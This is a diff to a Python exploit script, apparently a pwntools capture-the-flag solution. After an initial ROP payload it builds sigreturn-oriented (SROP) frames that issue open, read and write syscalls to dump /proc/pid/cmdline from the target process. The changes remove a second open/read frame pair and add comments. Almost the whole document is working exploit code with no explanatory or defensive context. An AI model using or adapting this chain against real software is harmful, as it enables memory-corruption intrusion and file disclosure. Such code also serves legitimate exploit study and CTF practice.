@@ -68,18 +68,17 @@ def exploit(p,e):
     p.sendline(pad + chain)
     pause()
 
-
     i = 0
     frame_size = 0
 
+    
     # open("/proc/(pid)/cmdline")
-    # Basic PTRACE SIG Ret    
     frame = SigreturnFrame(kernel='amd64')
     frame.rip = syscall_ret
     frame.rbp = buffer
     frame.rsp = buffer + memory_size + (frame_size) * i
     frame.rax = 2 # open
-    frame.rdi = buffer 
+    frame.rdi = buffer # /proc/pid/cmdline
 
     i += 1
     frame_size = 8 + len(bytes(frame))
@@ -90,9 +89,9 @@ def exploit(p,e):
     
     frame.rsp = buffer + memory_size + (frame_size) * i
     frame.rax = 0 # read 
-    frame.rdi = 3
-    frame.rsi = buffer + 0x30
-    frame.rdx = 0x30
+    frame.rdi = 3 # fd
+    frame.rsi = buffer + 0x30 # fake stack
+    frame.rdx = 0x30 #size 
 
     i += 1
     frame_size = 8 + len(bytes(frame))
@@ -100,52 +99,15 @@ def exploit(p,e):
 
     chain2 += p64(sigreturn_sys) + bytes(frame)
     
-
-    frame = SigreturnFrame(kernel='amd64')
-    frame.rip = syscall_ret
-    frame.rbp = buffer
-    frame.rsp = buffer + memory_size + (frame_size) * i
-    frame.rax = 2 # open
-    frame.rdi = buffer + 0x39
-
-    i += 1
-    frame_size = 8 + len(bytes(frame))
-    frame.rsp = buffer + memory_size + (frame_size) * i
-
-    chain2 += p64(sigreturn_sys) + bytes(frame)
-    
-
-    frame.rsp = buffer + memory_size + (frame_size) * i
-    frame.rax = 0 # read 
-    frame.rdi = 4
-    frame.rsi = buffer + 0x50
-    frame.rdx = 0x30
-
-    i += 1
-    frame_size = 8 + len(bytes(frame))
-    frame.rsp = buffer + memory_size + (frame_size) * i
-
-    chain2 += p64(sigreturn_sys) + bytes(frame)
- 
-
     frame.rsp = buffer + memory_size + (frame_size) * i
     frame.rax = 1 # write
-    frame.rdi = 1
-    frame.rsi = buffer + 0x39
-    frame.rdx = 0x40
+    frame.rdi = 1 # stdout
 
     i += 1
     frame_size = 8 + len(bytes(frame))
     frame.rsp = buffer + memory_size + (frame_size) * i
 
     chain2 += p64(sigreturn_sys) + bytes(frame)
- 
-
-
-
-
-
-
 
 
     p.sendline(chain2)
